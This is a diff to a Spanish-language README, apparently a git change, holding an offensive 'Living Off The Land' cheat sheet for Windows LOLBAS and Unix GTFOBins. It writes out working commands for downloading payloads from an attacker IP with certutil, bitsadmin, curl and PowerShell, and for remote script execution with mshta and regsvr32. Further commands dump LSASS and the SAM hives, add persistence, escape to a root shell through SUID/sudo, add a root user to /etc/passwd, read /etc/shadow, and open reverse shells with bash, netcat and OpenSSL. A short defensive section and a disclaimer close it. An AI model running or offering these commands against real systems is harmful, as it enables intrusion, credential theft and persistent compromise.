@@ -1,12 +1,16 @@
-# 🏹 LOLBAS-GTFOBins - Guía de referencia completa
-
 <!-- language-home-navigation -->
-[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)
+
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🏹 Vivir de la tierra (LOLBAS y GTFOBins) - Hoja de referencia completa
 
+[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
 ```
   ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
   ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
@@ -16,62 +20,61 @@
   ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                  Living Off The Land (Windows LOLBAS & Unix GTFOBins)
 ```
-
-<p align="center">
+<p align="centro">
   <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
   <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
-  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Defense Evasion">
-  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Living Off The Land">
+  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Evasión de defensa">
+  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Vivir de la tierra">
 </p>
 
-<p align="center">
-  <b>🛠️ Comprehensive reference for abusing legitimate pre-installed system binaries to execute code, download payloads, and escalate privileges</b>
+<p align="centro">
+  <b>🛠️ Referencia completa sobre el abuso de archivos binarios legítimos del sistema preinstalados para ejecutar código, descargar cargas útiles y escalar privilegios</b>
 </p>
 
 ---
 
 ## 📋 Tabla de contenidos
 
-- [Introducción](#-introduction)
-- [Why Living Off The Land?](#-why-living-off-the-land)
-- [Part 1: Windows LOLBAS](#-part-1-windows-lolbas)
-  - [3. 📉 **Low Operational Footprint:** Reduces log forensic anomalies by utilizing native administration tools.](#file-download--ingress)
-  - [Code Execution & AppLocker Bypass](#code-execution--applocker-bypass)
-  - [Credential Dumping (LSASS, SAM, LSA)](#credential-dumping-lsass-sam-lsa)
-  - [Reconnaissance & Discovery](#reconnaissance--discovery)
-  - [Reconnaissance & Discovery](#persistence--scheduled-tasks)
-- [Part 2: Unix / Linux GTFOBins](#-part-2-unix--linux-gtfobins)
-  - [SUID & Sudo Shell Escapes](#suid--sudo-shell-escapes)
-  - [File Read & Write Exploitation](#file-read--write-exploitation)
-  - [Network Ingress & Reverse Shells](#network-ingress--reverse-shells)
-  - [GTFOBins High-Impact Interpreters](#gtfobins-high-impact-interpreters)
-- [Referencia rápida](#-quick-reference-table)
-- [Defensive Considerations & Detection](#-defensive-considerations--detection)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [Recursos y referencias](#-resources)
+- [Introducción](#-introducción)
+- [¿Por qué vivir de la tierra?](#-porque-vivir-de-la-tierra)
+- [Parte 1: Windows LOLBAS](#-parte-1-windows-lolbas)
+  - [Descarga e ingreso de archivos] (#descarga de archivos--ingreso)
+  - [Ejecución de código y omisión de AppLocker](#ejecución de código--omisión-applocker)
+  - [Volcado de credenciales (LSASS, SAM, LSA)](#credential-dumping-lsass-sam-lsa)
+  - [Reconocimiento y descubrimiento](#reconocimiento--descubrimiento)
+  - [Persistencia y tareas programadas] (#persistencia-tareas programadas)
+- [Parte 2: GTFOBins de Unix/Linux](#-part-2-unix--linux-gtfobins)
+  - [Escapes de SUID y Sudo Shell](#suid--sudo-shell-escapes)
+  - [Explotación de lectura y escritura de archivos](#file-read--write-exploitation)
+  - [Ingreso a la red y shells inversos] (#ingress-network--shells-inversos)
+  - [Intérpretes de alto impacto GTFOBins](#gtfobins-intérpretes-de-alto-impacto)
+- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
+- [Consideraciones defensivas y detección](#-consideraciones-defensivas--detección)
+- [Aviso legal](#-aviso-legal)
+- [Recursos](#-recursos)
 
 ---
 
 ## 🎯 Introducción
 
-**Living Off The Land (LotL)** is a post-exploitation tradecraft where attackers and red teamers exclusively use legitimate, built-in, trusted system binaries, scripts, and libraries already present on the operating system.
+**Living Off The Land (LotL)** es una técnica posterior a la explotación en la que los atacantes y los equipos rojos utilizan exclusivamente archivos binarios, scripts y bibliotecas de sistemas legítimos, integrados y confiables que ya están presentes en el sistema operativo.
 
-- **LOLBAS (Windows)**: Living Off The Land Binaries, Scripts, and Libraries.
-- **GTFOBins (Unix/Linux)**: Curated collection of Unix binaries that can be abused to bypass local security restrictions, escape restricted shells, and escalate privileges.
-
----
-
-## ⚖️ Why Living Off The Land?
-
-1. 🛡️ **Bypasses Application Whitelisting:** Binaries like `certutil.exe`, `rundll32.exe`, or `find` are digitally signed by Microsoft or OS vendors and trusted by AppLocker, WDAC, and SELinux.
-2. 👁️ **Evades Signature-Based AV/EDR:** No foreign malicious executable (`.exe`, `.elf`) is dropped onto disk.
-3. 📉 **Low Operational Footprint:** Reduces log forensic anomalies by utilizing native administration tools.
+- **LOLBAS (Windows):** Vivir de la tierra: binarios, scripts y bibliotecas.
+- **GTFOBins (Unix/Linux):** Colección seleccionada de archivos binarios de Unix de los que se puede abusar para eludir las restricciones de seguridad locales, escapar de shells restringidos y escalar privilegios.
 
 ---
 
-## 🪟 Part 1: Windows LOLBAS
+## ⚖️ ¿Por qué vivir de la tierra?
 
-### 3. 📉 **Low Operational Footprint:** Reduces log forensic anomalies by utilizing native administration tools.
+1. 🛡️ **Evita la lista blanca de aplicaciones:** Los archivos binarios como `certutil.exe`, `rundll32.exe` o `find` están firmados digitalmente por Microsoft o proveedores de sistemas operativos y AppLocker, WDAC y SELinux confían en ellos.
+2. 👁️ **Evade AV/EDR basado en firmas:** No se coloca ningún ejecutable malicioso externo (`.exe`, `.elf`) en el disco.
+3. 📉 **Baja huella operativa:** Reduce las anomalías forenses de registros mediante el uso de herramientas de administración nativas.
+
+---
+
+## 🪟 Parte 1: Windows LOLBAS
+
+### Descarga e ingreso de archivos
 
 #### 1. Certutil.exe
 ```cmd
@@ -82,14 +85,12 @@ certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe
 certutil.exe -encode payload.exe encoded.txt
 certutil.exe -decode encoded.txt payload.exe
 ```
-
 #### 2. Bitsadmin.exe
 ```cmd
 :: Asynchronous background download
 bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
 ```
-
-#### 1. Certutil.exe
+#### 3. Curl.exe y PowerShell
 ```powershell
 :: Built-in curl (Windows 10+)
 curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe
@@ -97,12 +98,11 @@ curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe
 :: PowerShell download string
 powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
 ```
-
 ---
 
-### Code Execution & AppLocker Bypass
+### Ejecución de código y omisión de AppLocker
 
-#### 1. Mshta.exe (Execute Remote HTA/VBScript)
+#### 1. Mshta.exe (Ejecutar HTA/VBScript remoto)
 ```cmd
 :: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
 mshta.exe http://10.10.14.5/payload.hta
@@ -110,14 +110,12 @@ mshta.exe http://10.10.14.5/payload.hta
 :: Inline VBScript execution
 mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
 ```
-
-#### 2. Regsvr32.exe (Squiblydoo Technique)
+#### 2. Regsvr32.exe (Técnica Squiblydoo)
 ```cmd
 :: Executes remote scriptlet (.sct) via COM without touching disk
 regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
 ```
-
-#### 1. Mshta.exe (Execute Remote HTA/VBScript)
+#### 3. Rundll32.exe
 ```cmd
 :: Execute exported DLL function
 rundll32.exe payload.dll,EntryPoint
@@ -125,25 +123,22 @@ rundll32.exe payload.dll,EntryPoint
 :: Execute JavaScript in memory
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
 ```
-
-#### 2. Regsvr32.exe (Squiblydoo Technique)
+#### 4. Wmic.exe (ejecución de script XSL)
 ```cmd
 :: Execute arbitrary code via XSL stylesheet
 wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
 ```
-
-#### 3. Rundll32.exe
+#### 5. Installutil.exe
 ```cmd
 :: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
 ```
-
 ---
 
-### Credential Dumping (LSASS, SAM, LSA)
+### Volcado de credenciales (LSASS, SAM, LSA)
 
-#### 1. Rundll32.exe + Comsvcs.dll (LSASS Dump)
-Dump LSASS process memory without dropping Mimikatz:
+#### 1. Rundll32.exe + Comsvcs.dll (volcado de LSASS)
+Vuelque la memoria del proceso LSASS sin descartar Mimikatz:
 ```powershell
 # Find LSASS Process ID
 $lsassPid = (Get-Process lsass).Id
@@ -151,19 +146,16 @@ $lsassPid = (Get-Process lsass).Id
 # Create minidump using built-in comsvcs.dll (Requires Administrator)
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
 ```
-
-#### Credential Dumping (LSASS, SAM, LSA)
+#### 2. Reg.exe (Guardar colmenas SAM, SISTEMA y SEGURIDAD)
 ```cmd
 :: Dump local credential hives for offline extraction
 reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
 reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
 reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
 ```
-
 ---
 
-### Reconnaissance & Discovery
-
+### Reconocimiento y descubrimiento
 ```cmd
 :: Find internal domain controllers
 nltest /dclist:domain.local
@@ -178,11 +170,9 @@ dsquery user -name *admin*
 :: Check active network connections with process IDs
 netstat -ano
 ```
-
 ---
 
-### Reconnaissance & Discovery
-
+### Persistencia y tareas programadas
 ```cmd
 :: Create scheduled task running every 15 minutes as SYSTEM
 schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"
@@ -190,16 +180,15 @@ schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe"
 :: Add Registry Run Key for current user
 reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
 ```
-
 ---
 
-## 🐧 Part 2: Unix / Linux GTFOBins
+## 🐧 Parte 2: GTFOBins de Unix/Linux
 
-### SUID & Sudo Shell Escapes
+### Escapes de SUID y Sudo Shell
 
-When a binary has SUID set (`chmod u+s`) or is granted in `sudo -l`, abuse it for an immediate root shell:
+Cuando un binario tiene SUID configurado (`chmod u+s`) o se otorga en `sudo -l`, abusa de él para un shell raíz inmediato:
 
-#### 🐧 Part 2: Unix / Linux GTFOBins
+#### 1. Sudo/SUID `find`
 ```bash
 # SUID
 find . -exec /bin/sh -p \; -quit
@@ -207,7 +196,6 @@ find . -exec /bin/sh -p \; -quit
 # Sudo
 sudo find . -exec /bin/sh \; -quit
 ```
-
 #### 2. Sudo / SUID `vim` / `vi`
 ```bash
 # Escape from inside vim
@@ -216,25 +204,21 @@ sudo find . -exec /bin/sh \; -quit
 # One-liner execution
 vim -c ':!/bin/sh'
 ```
-
-#### 1. Sudo / SUID `find`
+#### 3. Sudo/SUID `awk`
 ```bash
 sudo awk 'BEGIN {system("/bin/sh")}'
 ```
-
-#### 2. Sudo / SUID `vim` / `vi`
+#### 4. Sudo/SUID `tar`
 ```bash
 # Checkpoint command execution
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
-
-#### 3. Sudo / SUID `awk`
+#### 5. Sudo/SUID `nano`
 ```bash
 # Inside nano: Press Ctrl+R, then Ctrl+X, then type:
 reset; sh 1>&0 2>&0
 ```
-
-#### 4. Sudo / SUID `tar`
+#### 6. Sudo/SUID `env`
 ```bash
 # SUID
 env /bin/sh -p
@@ -242,27 +226,24 @@ env /bin/sh -p
 # Sudo
 sudo env /bin/sh
 ```
-
-#### 5. Sudo / SUID `nano`
+#### 7. Sudo `less` / `more` / `man`
 ```bash
 # Inside pager: Type !/bin/sh and press Enter
 !/bin/sh
 ```
-
 ---
 
-### File Read & Write Exploitation
+### Explotación de lectura y escritura de archivos
 
-When you cannot spawn a shell directly, use file-read/write utilities to overwrite `/etc/passwd` or read `/etc/shadow`:
+Cuando no pueda generar un shell directamente, utilice utilidades de lectura/escritura de archivos para sobrescribir `/etc/passwd` o leer `/etc/shadow`:
 
-#### Overwrite `/etc/passwd` via Sudo/SUID `tee`
+#### Sobrescribir `/etc/passwd` mediante Sudo/SUID `tee`
 ```bash
 # Generate password hash: openssl passwd -1 -salt evil P@ss123
 echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
 su root2
 ```
-
-#### Read Sensitive Files via SUID Binaries
+#### Leer archivos confidenciales a través de binarios SUID
 ```bash
 # Base64
 base64 /etc/shadow | base64 --decode
@@ -273,40 +254,35 @@ xxd /etc/shadow | xxd -r
 # Head / Tail
 head -n 100 /etc/shadow
 ```
-
 ---
 
-### Network Ingress & Reverse Shells
+### Ingreso de red y shells inversos
 
-Transfer files and pop shells without `curl` or `wget`:
+Transfiera archivos y pop shells sin `curl` o `wget`:
 
-#### 1. Bash Native TCP Reverse Shell
+#### 1. Shell inverso de TCP nativo de Bash
 ```bash
 bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
 ```
-
-#### 2. Native Netcat (Without `-e` Flag)
+#### 2. Netcat nativo (sin bandera `-e`)
 ```bash
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
 ```
-
-#### 1. Bash Native TCP Reverse Shell
-On attacker:
+#### 3. Shell inverso cifrado OpenSSL
+Sobre el atacante:
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
 ```
-2. Native Netcat (Without `-e` Flag)
+En el objetivo:
 ```bash
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
 ```
-
 ---
 
-### GTFOBins High-Impact Interpreters
+### Intérpretes de alto impacto de GTFOBins
 
-If interpreters are granted Sudo / SUID:
-
+Si a los intérpretes se les concede Sudo / SUID:
 ```bash
 # Python
 sudo python3 -c 'import os; os.system("/bin/sh")'
@@ -323,42 +299,41 @@ sudo php -r "system('/bin/sh');"
 # Lua
 sudo lua -e 'os.execute("/bin/sh")'
 ```
-
 ---
 
-## 📊 Referencia rápida
+## 📊 Tabla de referencia rápida
 
-|OS|Binary|Propósito|Abuse Command|
+| SO | Binario | Propósito | Comando de Abuso |
 |----|--------|---------|---------------|
-|**Win**|`certutil.exe`|Download file|`certutil -urlcache -split -f http://<IP>/file out.exe`|
-|**Win**|`mshta.exe`|Remote HTA Exec|`mshta http://<IP>/payload.hta`|
-|**Win**|`regsvr32.exe`|Scriptlet Exec|`regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll`|
-|**Win**|`rundll32.exe`|LSASS Dump|`rundll32 comsvcs.dll, MiniDump <PID> out.dmp full`|
-|**Unix**|`find`|SUID Shell|`find . -exec /bin/sh -p \; -quit`|
-|**Unix**|`awk`|Sudo Shell|`sudo awk 'BEGIN {system("/bin/sh")}'`|
-|**Unix**|`vim`|Shell Escape|`vim -c ':!/bin/sh'`|
-|**Unix**|`tee`|File Overwrite|`echo "root2:..." \|sudo tee -a /etc/passwd`|
+| **Gana** | `certutil.exe` | Descargar archivo | `certutil -urlcache -split -f http://<IP>/file out.exe` |
+| **Gana** | `mshta.exe` | Ejecutivo remoto de HTA | `mshta http://<IP>/payload.hta` |
+| **Gana** | `regsvr32.exe` | Ejecutivo de scriptlet | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
+| **Gana** | `rundll32.exe` | Volcado de LSASS | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
+| **Unix**| `find` | Carcasa SUID | `find . -exec /bin/sh -p \; -quit` |
+| **Unix**| `awk` | Sudo Shell | `sudo awk 'BEGIN {system("/bin/sh")}'` |
+| **Unix**| `vim` | Escape de concha | `vim -c ':!/bin/sh'` |
+| **Unix**| `tee` | Sobrescribir archivos | `echo "root2:..." \| sudo tee -a /etc/passwd` |
 
 ---
 
-## 🛡️ Defensive Considerations & Detection
+## 🛡️ Consideraciones defensivas y detección
 
-1. **Audit Command-Line Logging:**
-   Enable **Sysmon (Event ID 1)** and Windows Process Creation Logging (Event ID 4688) with command-line auditing to monitor anomalous arguments passed to `certutil`, `mshta`, and `rundll32`.
+1. **Auditar registro de línea de comandos:**
+   Habilite **Sysmon (ID de evento 1)** y el registro de creación de procesos de Windows (ID de evento 4688) con auditoría de línea de comandos para monitorear los argumentos anómalos pasados a `certutil`, `mshta` y `rundll32`.
 2. **Block Malicious Parent-Child Relationships:**
    Monitor `mshta.exe` or `regsvr32.exe` spawning `cmd.exe` or `powershell.exe`.
-3. **Restrict Sudo Directives:**
-   Avoid wildcards (`*`) in `/etc/sudoers`. Never allow users to run text editors (`vim`, `nano`) or compilers as root.
+3. **Restringir directivas Sudo:**
+   Evite los comodines (`*`) en `/etc/sudoers`. Never allow users to run text editors (`vim`, `nano`) or compilers as root.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Aviso legal
 
 > **IMPORTANT:** Living Off The Land techniques abuse trusted administrative utilities. This cheatsheet is strictly for authorized security assessments, defensive hardening, and educational study.
 
 ---
 
-## 📚 Recursos y referencias
+## 📚 Recursos
 
 - [LOLBAS Project Official Repository](https://lolbas-project.github.io/)
 - [GTFOBins Official Repository](https://gtfobins.github.io/)
